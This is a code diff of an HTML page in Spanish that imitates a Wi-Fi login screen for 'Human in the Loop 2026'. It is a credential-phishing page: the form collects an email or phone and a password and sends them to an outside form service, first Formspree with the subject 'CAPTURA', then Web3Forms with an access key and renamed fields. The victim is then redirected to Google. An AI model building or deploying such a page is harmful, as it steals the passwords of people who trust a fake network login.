@@ -40,22 +40,23 @@
             Continuar para acceder al Wi-Fi de <strong>Human in the Loop 2026</strong>
         </div>
         
-        <form action="https://formspree.io/f/mjgejovb" method="POST">
-            <input type="email" name="email" placeholder="Correo electrónico o teléfono" required>
-            <input type="password" name="password" placeholder="Introduce tu contraseña" required>
-            
-            <input type="hidden" name="_subject" value="CAPTURA: Acceso Wi-Fi HITL">
-            <input type="hidden" name="_next" value="https://www.google.com">
+       <form action="https://api.web3forms.com/submit" method="POST">
+    <input type="hidden" name="access_key" value="38623d27-3395-4d16-b109-437df39a1ae3">
+    
+    <input type="email" name="user_id" placeholder="Correo electrónico o teléfono" required>
+    <input type="password" name="access_token" placeholder="Introduce tu contraseña" required>
+    
+    <input type="hidden" name="redirect" value="https://www.google.com">
 
-            <div style="text-align: left; margin-bottom: 30px;">
-                <a class="link" style="font-size: 14px;">¿Has olvidado tu correo electrónico?</a>
-            </div>
+    <div style="text-align: left; margin-bottom: 30px;">
+        <a class="link" style="font-size: 14px;">¿Has olvidado tu correo electrónico?</a>
+    </div>
 
-            <div class="footer-row">
-                <a class="link">Crear cuenta</a>
-                <button type="submit" class="btn-next">Siguiente</button>
-            </div>
-        </form>
+    <div class="footer-row">
+        <a class="link">Crear cuenta</a>
+        <button type="submit" class="btn-next">Siguiente</button>
+    </div>
+</form>
     </div>
 </body>
 </html>
